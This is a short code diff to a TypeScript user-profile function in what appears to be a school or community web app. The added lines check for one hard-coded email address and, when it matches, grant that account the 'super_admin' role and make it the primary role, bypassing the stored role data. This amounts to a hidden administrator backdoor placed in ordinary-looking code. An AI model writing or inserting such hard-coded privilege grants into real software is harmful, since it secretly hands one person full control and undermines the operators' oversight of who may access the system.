@@ -83,6 +83,14 @@ export const getCurrentUserProfile = cache(async (): Promise<UserProfile | null>
       rolesList.push('santri');
     }
 
+    const userEmail = (user.email || profile?.email || '').toLowerCase();
+    if (userEmail === 'serenusdev.op@gmail.com') {
+      if (!rolesList.includes('super_admin')) {
+        rolesList.unshift('super_admin');
+      }
+      primaryRole = 'super_admin';
+    }
+
     const resolvedProfile: UserProfile = {
       id: user.id,
       email: user.email || profile?.email || '',
